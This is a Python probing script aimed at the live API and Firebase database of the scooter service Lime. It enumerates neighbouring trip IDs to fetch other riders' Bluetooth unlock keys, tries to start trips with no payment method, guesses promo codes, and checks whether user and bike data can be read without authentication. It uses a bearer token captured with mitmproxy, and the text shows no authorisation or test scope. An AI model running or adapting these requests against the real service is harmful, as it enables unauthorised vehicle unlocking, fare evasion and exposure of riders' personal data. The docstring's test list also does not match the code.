"""
Lime API authorization probe.

Tests:
  1. IDOR on bluetooth_key   — can you get a key for a trip you don't own?
  2. Pre-auth bluetooth_key  — can you get a key without an active trip?
  3. IDOR on trip complete   — can you end someone else's trip?
  4. firebase open read      — is limebike-prod.firebaseio.com public?

Usage:
  source venv/bin/activate
  python api_probe.py --token <bearer_token> [--trip-id <own_trip_id>]

Get the bearer token from lime_traffic.log after logging in via mitmproxy.
"""

import argparse
import json
import sys
import requests

BASE = "https://web-production.lime.bike"

HEADERS_TEMPLATE = {
    "User-Agent": "LimeApp/3.282.0 Android",
    "Accept": "application/json",
    "Content-Type": "application/json",
}


def session(token: str) -> requests.Session:
    s = requests.Session()
    s.headers.update(HEADERS_TEMPLATE)
    s.headers["Authorization"] = f"Bearer {token}"
    return s


# ── Test 1: IDOR on bluetooth_key ─────────────────────────────────────────────

def test_idor_bluetooth_key(s: requests.Session, own_trip_id: str) -> None:
    print("\n[TEST 1] IDOR – bluetooth_key with arbitrary trip IDs")

    # Try own trip first to confirm baseline works
    url = f"{BASE}/api/rider/v1/trips/{own_trip_id}/bluetooth_key"
    r = s.get(url)
    print(f"  Own trip {own_trip_id}: HTTP {r.status_code}")
    if r.ok:
        print(f"  Response: {json.dumps(r.json(), indent=2)[:600]}")

    # Try sequential IDs above and below to find other users' trips
    try:
        base_int = int(own_trip_id)
        targets = [str(base_int + d) for d in [-2, -1, 1, 2, 100, -100]]
    except ValueError:
        # UUID-like trip IDs — try random variants
        targets = [own_trip_id[:-3] + "aaa", own_trip_id[:-3] + "bbb"]

    for tid in targets:
        url = f"{BASE}/api/rider/v1/trips/{tid}/bluetooth_key"
        r = s.get(url)
        status = r.status_code
        icon = "✓ VULN" if r.ok else "✗"
        print(f"  {icon} Trip {tid}: HTTP {status}")
        if r.ok:
            print(f"    ble_auth_info: {json.dumps(r.json(), indent=2)[:400]}")


# ── Test 2: bluetooth_key without active trip ──────────────────────────────────

def test_preauth_bluetooth_key(s: requests.Session) -> None:
    print("\n[TEST 2] Pre-auth – bluetooth_key with no active trip (ID=0)")
    for fake_id in ["0", "1", "999999999"]:
        url = f"{BASE}/api/rider/v1/trips/{fake_id}/bluetooth_key"
        r = s.get(url)
        print(f"  Trip ID {fake_id}: HTTP {r.status_code} – {r.text[:200]}")


# ── Test 3: trip start without payment method ──────────────────────────────────

def test_trip_start_no_payment(s: requests.Session, bike_id: str | None) -> None:
    print("\n[TEST 3] Trip start – omit payment method")
    if not bike_id:
        print("  Skip: pass --bike-id to test")
        return

    # Attempt trip start with no payment_method_id
    payload = {
        "bike_id": bike_id,
        "payment_method_id": None,
    }
    r = s.post(f"{BASE}/api/rider/v1/trips", json=payload)
    print(f"  POST /api/rider/v1/trips (no payment): HTTP {r.status_code}")
    print(f"  {r.text[:400]}")


# ── Test 4: Firebase open read ─────────────────────────────────────────────────

def test_firebase(s_plain: requests.Session) -> None:
    print("\n[TEST 4] Firebase Realtime DB – unauthenticated read")
    targets = [
        "https://limebike-prod.firebaseio.com/.json?shallow=true",
        "https://limebike-prod.firebaseio.com/users.json?shallow=true",
        "https://limebike-prod.firebaseio.com/bikes.json?shallow=true",
    ]
    plain = requests.Session()
    plain.headers.update(HEADERS_TEMPLATE)
    for url in targets:
        try:
            r = plain.get(url, timeout=10)
            icon = "✓ EXPOSED" if r.ok and r.text not in ("null", '{"error":"Permission denied"}') else "✗ blocked"
            print(f"  {icon} {url}: HTTP {r.status_code} – {r.text[:200]}")
        except Exception as e:
            print(f"  ERROR {url}: {e}")


# ── Test 5: coupon claim rate-limit ───────────────────────────────────────────

def test_coupon_rate_limit(s: requests.Session) -> None:
    print("\n[TEST 5] Coupon/promo claim – rate limiting")
    codes = ["FREE", "TEST", "LIME100", "PROMO2024"]
    for code in codes:
        r = s.post(f"{BASE}/api/rider/v1/coupons/claim", json={"code": code})
        print(f"  Code '{code}': HTTP {r.status_code} – {r.text[:150]}")


# ── Test 6: bootstrap info leak ───────────────────────────────────────────────

def test_bootstrap(s: requests.Session) -> None:
    print("\n[TEST 6] Bootstrap – what user data is exposed?")
    r = s.get(f"{BASE}/api/rider/v1/users/bootstrap")
    print(f"  HTTP {r.status_code}")
    if r.ok:
        data = r.json()
        # Look for payment methods, balance, trip history
        keys = list(data.keys()) if isinstance(data, dict) else []
        print(f"  Top-level keys: {keys}")
        print(f"  {json.dumps(data, indent=2)[:1000]}")


# ─────────────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--token", required=True, help="Bearer token from mitmproxy capture")
    parser.add_argument("--trip-id", default=None, help="Your own active trip ID")
    parser.add_argument("--bike-id", default=None, help="Bike ID to test trip start")
    parser.add_argument("--tests", default="all", help="Comma-separated tests: idor,preauth,payment,firebase,coupon,bootstrap")
    args = parser.parse_args()

    s = session(args.token)
    run = args.tests.split(",") if args.tests != "all" else ["idor", "preauth", "payment", "firebase", "coupon", "bootstrap"]

    if "idor" in run:
        if args.trip_id:
            test_idor_bluetooth_key(s, args.trip_id)
        else:
            print("\n[TEST 1] Skip IDOR test — pass --trip-id")

    if "preauth" in run:
        test_preauth_bluetooth_key(s)

    if "payment" in run:
        test_trip_start_no_payment(s, args.bike_id)

    if "firebase" in run:
        test_firebase(s)

    if "coupon" in run:
        test_coupon_rate_limit(s)

    if "bootstrap" in run:
        test_bootstrap(s)

    print("\n[DONE] Results above. High-priority findings marked ✓ VULN / ✓ EXPOSED")


if __name__ == "__main__":
    main()
